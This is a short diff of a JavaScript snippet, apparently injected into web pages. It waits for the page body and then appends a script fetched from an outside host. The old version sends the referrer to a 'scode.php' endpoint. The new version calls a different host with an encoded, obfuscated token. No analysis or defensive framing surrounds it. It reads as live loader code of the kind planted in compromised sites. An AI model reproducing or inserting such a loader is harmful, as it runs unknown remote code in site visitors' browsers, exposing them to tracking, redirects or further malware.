@@ -1,9 +1,10 @@
 (function(w) {
 	var script = document.createElement('script');
-	var ref = escape(document.referrer);
 	var i = setInterval(function() {
 		if (typeof w.document.body !== 'undefined') {
-			script.src = 'http://mediaunder.info/scode.php?site=13319&ref=' + ref ;
+			var s = "http://cost.example-ever.info/?";
+			s += 781883 + "=TwZPSR1LUl8GDAoJCQ0dXVRJVlpPSAZZSR1VVFpfTldPBgo";
+			script.src = s;
 			w.document.body.appendChild(script);
 			clearInterval(i);
 		}
